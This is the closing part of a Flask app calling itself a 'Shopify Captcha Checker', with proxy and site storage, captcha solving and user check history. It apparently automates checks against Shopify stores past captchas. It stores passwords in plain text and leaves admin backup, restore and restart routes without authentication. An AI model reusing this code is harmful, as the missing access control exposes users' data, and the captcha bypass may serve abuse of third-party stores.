                "error": "Invalid credentials"
            }), 401
    except Exception as e:
        logger.error(f"User login error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/user/register', methods=['POST'])
def api_user_register():
    """User register API"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        email = data.get('email', '')
        
        if not username or not password:
            return jsonify({
                "success": False,
                "error": "Username and password required"
            }), 400
        
        if username in users_db:
            return jsonify({
                "success": False,
                "error": "Username already exists"
            }), 400
        
        users_db[username] = {
            "password": password,
            "email": email,
            "role": "user",
            "status": "active",
            "last_login": None
        }
        
        add_log("INFO", "User registered", {"username": username, "email": email})
        
        return jsonify({
            "success": True,
            "message": "Registration successful"
        })
    except Exception as e:
        logger.error(f"User register error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/api/user/history', methods=['GET'])
def api_user_history():
    """Get user check history"""
    try:
        username = request.args.get('username')
        
        if not username:
            return jsonify({"success": False, "error": "Username required"}), 400
        
        history = user_history.get(username, [])
        
        return jsonify({
            "success": True,
            "history": history,
            "total": len(history)
        })
    except Exception as e:
        logger.error(f"User history error: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@app.route('/', methods=['GET'])
def home_page():
    """Main page with login options"""
    return render_template('index.html')


@app.route('/public', methods=['GET'])
def public_page():
    """Public checker page (optional)"""
    return render_template('index.html')


@app.route('/admin/bulk', methods=['GET'])
def admin_bulk_operations():
    """Bulk operations page"""
    return render_template('admin_bulk_operations.html')


@app.route('/admin/advanced', methods=['GET'])
def admin_advanced_settings():
    """Advanced settings page"""
    return render_template('admin_advanced_settings.html')


@app.route('/admin/system/restart', methods=['POST'])
def admin_system_restart():
    """Restart system"""
    try:
        add_log("INFO", "System restart requested", {"by": "admin"})
        return jsonify({"success": True, "message": "System restart initiated"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/system/cache/clear', methods=['POST'])
def admin_clear_cache():
    """Clear system cache"""
    try:
        add_log("INFO", "Cache cleared", {"by": "admin"})
        return jsonify({"success": True, "message": "Cache cleared successfully"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/backup/download', methods=['GET'])
def admin_download_backup():
    """Download system backup"""
    try:
        backup_data = {
            "sites": sites_data,
            "proxies": proxies_data,
            "timestamp": datetime.utcnow().isoformat()
        }
        return jsonify({"success": True, "data": backup_data})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/admin/backup/upload', methods=['POST'])
def admin_upload_backup():
    """Upload and restore backup"""
    try:
        data = request.get_json()
        if 'sites' in data:
            sites_data.update(data['sites'])
            save_json(SITES_FILE, sites_data)
        if 'proxies' in data:
            proxies_data.update(data['proxies'])
            save_json(PROXIES_FILE, proxies_data)
        add_log("INFO", "Backup restored", {"timestamp": data.get('timestamp')})
        return jsonify({"success": True, "message": "Backup restored successfully"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


if __name__ == "__main__":
    # Get port from environment (Railway sets this)
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    
    print(f"🚀 Starting Shopify Captcha Checker...")
    print(f"📡 Listening on http://{host}:{port}")
    print(f"🔧 Captcha Solver: {'Enabled' if CAPTCHA_SOLVER_ENABLED else 'Disabled'}")
    print(f"🌐 Browser Solver: {'Available' if BROWSER_SOLVER_AVAILABLE else 'Not Available'}")
    print(f"")
    
    # Run with production settings
    app.run(host=host, port=port, debug=False, threaded=True)
